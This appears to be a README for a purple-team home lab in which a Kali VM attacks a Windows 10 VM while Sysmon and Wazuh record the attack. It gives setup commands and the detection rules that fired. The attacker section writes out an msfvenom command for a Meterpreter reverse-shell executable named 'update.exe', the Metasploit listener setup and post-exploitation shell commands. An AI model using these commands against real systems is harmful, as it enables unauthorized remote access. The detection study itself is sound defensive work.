# 🛡️ Purple Home Lab

## 📖 Project Overview

This virtual laboratory is a "Purple Team" environment designed to simulate cyber attacks (Red Team) and study their detection in real-time (Blue Team) using a SIEM. The main objective is to observe the behavior of a malware executable and a reverse shell, capture these events via Sysmon, and centralize the alerts in Wazuh.

## 🏗️ Architecture and Environment

The lab consists of three virtual machines:

Attacker (Red Team): Kali Linux (Metasploit, payload generation)

Target (Victim): Windows 10 (Sysmon, Wazuh Agent)

Defense / SIEM (Blue Team): Ubuntu 22.04 (Wazuh Manager)

## 🛠️ Tools Used

Wazuh (v4.14): Open-source security platform (SIEM/XDR) for log analysis and threat detection.

Sysmon (Sysinternals): Advanced monitoring of Windows processes and network activity.

Metasploit Framework: Exploitation, listening, and Meterpreter session management.

## 🚀 Deployment and Configuration
This section details the exact commands used to set up the environment, install the necessary tools, and configure the log forwarding.

### 1. Ubuntu 22.04 VM (Wazuh Server / SIEM)
The core of the Blue Team infrastructure, responsible for receiving and analyzing logs.

*   `curl -sO https://packages.wazuh.com/4.14/wazuh-install.sh && sudo bash ./wazuh-install.sh -a`
    *   *Downloads and executes the automated Wazuh installation script (Manager, Indexer, and Dashboard).*

### 2. Windows 10 VM (Victim / Blue Team)
These commands were executed in **PowerShell (as Administrator)** to set up the monitoring tools.

**Sysmon Installation:**
*   `Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "$env:USERPROFILE\Desktop\Sysmon.zip"`
    *   *Downloads the Sysmon archive from the official Microsoft Sysinternals website.*
*   `Expand-Archive -Path "$env:USERPROFILE\Desktop\Sysmon.zip" -DestinationPath "$env:USERPROFILE\Desktop\Sysmon"`
    *   *Extracts the downloaded ZIP archive.*
*   `.\Sysmon64.exe -accepteula -i`
    *   *Installs Sysmon with default configurations, automatically accepting the end-user license agreement.*

**Wazuh Agent Installation & Configuration:**
*   `Invoke-WebRequest -Uri "https://packages.wazuh.com/4.14/windows/wazuh-agent-4.14.8-1.msi" -OutFile "$env:USERPROFILE\Desktop\wazuh-agent.msi"`
    *   *Downloads the specific Wazuh agent installer compatible with our server.*
*   `.\wazuh-agent.msi`
    *   *Launches the graphical installer (the Ubuntu server IP `192.168.122.164` was provided during this step).*
*   `Start-Service Wazuh`
    *   *Starts the Wazuh agent service to initiate communication with the server.*
*   `notepad "C:\Program Files\ossec-agent\ossec.conf"`
    *   *Opens the configuration file. We appended a `<localfile>` block to instruct Wazuh to collect `Microsoft-Windows-Sysmon/Operational` event logs.*
*   `Restart-Service Wazuh`
    *   *Restarts the service to apply the new Sysmon log forwarding configuration.*

### 3. Kali Linux VM (Attacker / Red Team)
These commands document the creation of the malware and the setup of the listening server to catch the victim's connection.

**Payload Generation:**
*   `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[KALI_IP] LPORT=4444 -f exe -o update.exe`
    *   *Generates a malicious executable (`update.exe`) that, when run on the target, initiates a reverse shell connection back to the Kali machine.*

**Listener Setup (in Metasploit):**
*   `msfconsole`
    *   *Starts the Metasploit Framework console.*
*   `use exploit/multi/handler`
    *   *Prepares a generic payload handler to receive the incoming connection.*
*   `set payload windows/x64/meterpreter/reverse_tcp`
    *   *Tells the handler to expect the exact same payload type we generated.*
*   `set LHOST [KALI_IP]` and `set LPORT 4444`
    *   *Configures the listening IP and port to match the payload.*
*   `exploit`
    *   *Starts the listener, waiting for the victim to execute the file.*

**Post-Exploitation (Once connected):**
*   `shell`
    *   *Opens a remote Windows command prompt on the victim's machine.*
*   `whoami`
    *   *A simple command to verify access, which acts as the trigger for our Sysmon/Wazuh detection rules.*

## ⚔️ Attack Simulation and Detection (Proof of Concept)

Scenario: Execution of a malicious payload (update.exe) on the target machine and opening of a remote shell.

Detection Results (Wazuh):
(Insert the screenshot of your Wazuh dashboard showing the alerts here)

Rule ID 92213 (Level 15): Executable file dropped and executed.

Rule ID 92203 (Level 6): Sysmon Event ID 1 (Process creation).

Rule ID 92052 (Level 4): Command execution via the remote shell.

## 🚧 Next Steps

[ ] Forensic Analysis: Analyze raw logs to extract Indicators of Compromise (IoCs) such as IPs and hashes.

[ ] Active Response: Configure Wazuh to automatically block the attacker's IP upon detection.

[ ] Custom Rules: Create tailored detection rules to reduce noise and highlight specific threats.
